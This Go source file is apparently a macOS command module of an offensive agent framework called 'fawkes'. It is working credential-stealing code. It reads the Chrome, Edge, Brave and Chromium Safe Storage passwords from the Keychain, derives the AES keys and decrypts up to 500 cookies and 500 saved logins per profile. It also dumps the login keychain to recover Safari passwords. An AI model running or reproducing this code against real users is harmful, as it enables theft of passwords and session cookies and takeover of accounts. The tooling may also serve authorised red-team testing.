//go:build darwin

package commands

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/crypto/pbkdf2"
)

// chromeSafeStorageKey retrieves the Chrome Safe Storage password from macOS Keychain
// and derives the AES-128-CBC key using PBKDF2.
func chromeSafeStorageKey(browserName string) ([]byte, error) {
	// Map browser names to their Keychain service/account names
	var service, account string
	switch strings.ToLower(browserName) {
	case "chrome":
		service = "Chrome Safe Storage"
		account = "Chrome"
	case "chromium":
		service = "Chromium Safe Storage"
		account = "Chromium"
	case "edge":
		service = "Microsoft Edge Safe Storage"
		account = "Microsoft Edge"
	case "brave":
		service = "Brave Safe Storage"
		account = "Brave Browser"
	default:
		return nil, fmt.Errorf("unsupported browser: %s", browserName)
	}

	// Retrieve password from Keychain
	cmd := safeCmd("security", "find-generic-password", "-w", "-s", service, "-a", account)
	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("keychain lookup failed for %s: %w", browserName, err)
	}

	password := strings.TrimSpace(string(output))
	if password == "" {
		return nil, fmt.Errorf("empty password from Keychain for %s", browserName)
	}

	// Derive AES-128 key: PBKDF2-HMAC-SHA1, salt="saltysalt", iterations=1003, keylen=16
	key := pbkdf2.Key([]byte(password), []byte("saltysalt"), 1003, 16, sha1.New)
	return key, nil
}

// chromeDecryptValue decrypts a Chrome v10-encrypted value using AES-128-CBC.
// Chrome macOS uses "v10" prefix + AES-128-CBC with IV of 16 spaces (0x20).
func chromeDecryptValue(encrypted []byte, key []byte) (string, error) {
	if len(encrypted) < 3 {
		return "", fmt.Errorf("ciphertext too short")
	}

	// Check for v10 prefix (macOS Chrome encryption)
	if string(encrypted[:3]) != "v10" {
		// Not encrypted or unknown format — return as-is
		return string(encrypted), nil
	}

	ciphertext := encrypted[3:]
	if len(ciphertext) == 0 {
		return "", nil
	}

	// AES-128-CBC with IV = 16 spaces
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("cipher init failed: %w", err)
	}

	if len(ciphertext)%aes.BlockSize != 0 {
		return "", fmt.Errorf("invalid ciphertext length: %d", len(ciphertext))
	}

	iv := make([]byte, aes.BlockSize)
	for i := range iv {
		iv[i] = 0x20 // space character
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS7 padding
	if len(plaintext) > 0 {
		padding := int(plaintext[len(plaintext)-1])
		if padding > 0 && padding <= aes.BlockSize {
			valid := true
			for i := len(plaintext) - padding; i < len(plaintext); i++ {
				if plaintext[i] != byte(padding) {
					valid = false
					break
				}
			}
			if valid {
				plaintext = plaintext[:len(plaintext)-padding]
			}
		}
	}

	return string(plaintext), nil
}

// browserChromiumCookies extracts and decrypts cookies from Chromium-based browsers on macOS.
func browserChromiumCookies(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type cookieEntry struct {
		Browser    string
		Host       string
		Name       string
		Value      string
		Path       string
		Expiry     string
		IsSecure   bool
		IsHTTPOnly bool
	}

	var allEntries []cookieEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if isFirefoxBrowser(browserName) {
			continue
		}
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		// Get decryption key from Keychain
		key, err := chromeSafeStorageKey(browserName)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "Cookies")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "Cookies")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies ORDER BY last_access_utc DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var host, name, path string
				var encryptedValue []byte
				var expiresUTC int64
				var isSecure, isHTTPOnly int

				if err := rows.Scan(&host, &name, &encryptedValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
					continue
				}

				value := ""
				if len(encryptedValue) > 0 {
					decrypted, err := chromeDecryptValue(encryptedValue, key)
					if err != nil {
						value = fmt.Sprintf("[decrypt error: %v]", err)
					} else {
						value = decrypted
					}
				}

				allEntries = append(allEntries, cookieEntry{
					Browser:    label,
					Host:       host,
					Name:       name,
					Value:      truncStr(value, 100),
					Path:       path,
					Expiry:     chromeTimeToString(expiresUTC),
					IsSecure:   isSecure != 0,
					IsHTTPOnly: isHTTPOnly != 0,
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Chromium Cookies (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		flags := ""
		if e.IsSecure {
			flags += " [Secure]"
		}
		if e.IsHTTPOnly {
			flags += " [HttpOnly]"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s: %s = %s  (path: %s, expires: %s)%s\n",
			e.Browser, e.Host, e.Name, e.Value, e.Path, e.Expiry, flags))
	}

	if len(allEntries) == 0 {
		sb.WriteString("No Chromium cookies found.\n")
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// browserChromiumPasswords extracts and decrypts saved passwords from Chromium-based browsers on macOS.
func browserChromiumPasswords(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type passwordEntry struct {
		Browser  string
		URL      string
		Username string
		Password string
	}

	var allEntries []passwordEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if isFirefoxBrowser(browserName) {
			continue
		}
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		key, err := chromeSafeStorageKey(browserName)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "Login Data")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "Login Data")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0 ORDER BY date_last_used DESC LIMIT 500")
			if err != nil {
				// Try without blacklisted_by_user filter (older schema)
				rows, err = db.Query("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used DESC LIMIT 500")
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
					cleanup()
					continue
				}
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var originURL, username string
				var passwordBlob []byte

				if err := rows.Scan(&originURL, &username, &passwordBlob); err != nil {
					continue
				}

				password := ""
				if len(passwordBlob) > 0 {
					decrypted, err := chromeDecryptValue(passwordBlob, key)
					if err != nil {
						password = fmt.Sprintf("[decrypt error: %v]", err)
					} else {
						password = decrypted
					}
				}

				if originURL == "" && username == "" && password == "" {
					continue
				}

				allEntries = append(allEntries, passwordEntry{
					Browser:  label,
					URL:      originURL,
					Username: username,
					Password: password,
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Chromium Passwords (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		sb.WriteString(fmt.Sprintf("[%s] %s\n  User: %s\n  Pass: %s\n\n",
			e.Browser, truncStr(e.URL, 120), e.Username, e.Password))
	}

	if len(allEntries) == 0 {
		sb.WriteString("No saved passwords found.\n")
	}

	if len(errors) > 0 {
		sb.WriteString("--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// browserSafariPasswords extracts saved internet passwords from the macOS Keychain.
// Safari stores passwords directly in the login keychain as "inet" class items.
func browserSafariPasswords() ([]safariPasswordEntry, []string) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	out, err := safeCmdContext(ctx, "security", "dump-keychain").CombinedOutput()
	if err != nil {
		return nil, []string{fmt.Sprintf("Safari: keychain dump failed: %v", err)}
	}

	var entries []safariPasswordEntry
	var errors []string

	blocks := splitSafariKeychainBlocks(string(out))
	for _, block := range blocks {
		class := extractSafariField(block, "class:")
		if class != "\"inet\"" {
			continue
		}

		server := extractSafariAttr(block, "\"srvr\"")
		account := extractSafariAttr(block, "\"acct\"")
		if server == "" && account == "" {
			continue
		}

		proto := extractSafariAttr(block, "\"ptcl\"")
		port := extractSafariAttr(block, "\"port\"")

		url := buildSafariURL(proto, server, port)

		entries = append(entries, safariPasswordEntry{
			URL:      url,
			Username: account,
		})
	}

	if len(entries) == 0 {
		return entries, errors
	}

	consecutiveFails := 0
	for i, e := range entries {
		if consecutiveFails >= 3 {
			break
		}

		cmdArgs := []string{"find-internet-password", "-g"}
		if e.URL != "" {
			server := serverFromURL(e.URL)
			if server != "" {
				cmdArgs = append(cmdArgs, "-s", server)
			}
		}
		if e.Username != "" {
			cmdArgs = append(cmdArgs, "-a", e.Username)
		}

		ctx2, cancel2 := context.WithTimeout(context.Background(), 3*time.Second)
		pwOut, pwErr := safeCmdContext(ctx2, "security", cmdArgs...).CombinedOutput()
		cancel2()
		if pwErr != nil {
			consecutiveFails++
			continue
		}

		for _, line := range strings.Split(string(pwOut), "\n") {
			if strings.HasPrefix(line, "password: ") {
				val := strings.TrimPrefix(line, "password: ")
				val = strings.Trim(val, "\"")
				if val != "" && !strings.HasPrefix(val, "0x") {
					entries[i].Password = val
					consecutiveFails = 0
				} else {
					consecutiveFails++
				}
				break
			}
		}
	}

	return entries, errors
}

type safariPasswordEntry struct {
	URL      string
	Username string
	Password string
}

func splitSafariKeychainBlocks(output string) []string {
	lines := strings.Split(output, "\n")
	var blocks []string
	var current strings.Builder
	for _, line := range lines {
		if strings.HasPrefix(line, "keychain:") && current.Len() > 0 {
			blocks = append(blocks, current.String())
			current.Reset()
		}
		current.WriteString(line)
		current.WriteByte('\n')
	}
	if current.Len() > 0 {
		blocks = append(blocks, current.String())
	}
	return blocks
}

func extractSafariField(block, prefix string) string {
	for _, line := range strings.Split(block, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, prefix) {
			return strings.TrimSpace(strings.TrimPrefix(trimmed, prefix))
		}
	}
	return ""
}

func extractSafariAttr(block, attrName string) string {
	for _, line := range strings.Split(block, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, attrName) && strings.Contains(trimmed, "=") {
			parts := strings.SplitN(trimmed, "=", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				val = strings.Trim(val, "\"")
				if val == "<NULL>" || val == "0x00000000" {
					return ""
				}
				return val
			}
		}
	}
	return ""
}

func buildSafariURL(proto, server, port string) string {
	scheme := "https"
	protoMap := map[string]string{
		"htps": "https", "http": "http", "ftp ": "ftp", "ftps": "ftps",
	}
	if mapped, ok := protoMap[proto]; ok {
		scheme = mapped
	}

	url := scheme + "://" + server
	if port != "" && port != "0" {
		defaultPorts := map[string]string{"https": "443", "http": "80", "ftp": "21"}
		if defPort, ok := defaultPorts[scheme]; !ok || port != defPort {
			url += ":" + port
		}
	}
	return url
}

func serverFromURL(url string) string {
	s := url
	if idx := strings.Index(s, "://"); idx >= 0 {
		s = s[idx+3:]
	}
	if idx := strings.Index(s, ":"); idx >= 0 {
		s = s[:idx]
	}
	if idx := strings.Index(s, "/"); idx >= 0 {
		s = s[:idx]
	}
	return s
}

// Ensure sql.NullString is importable (used by openBrowserDB)
var _ = sql.ErrNoRows
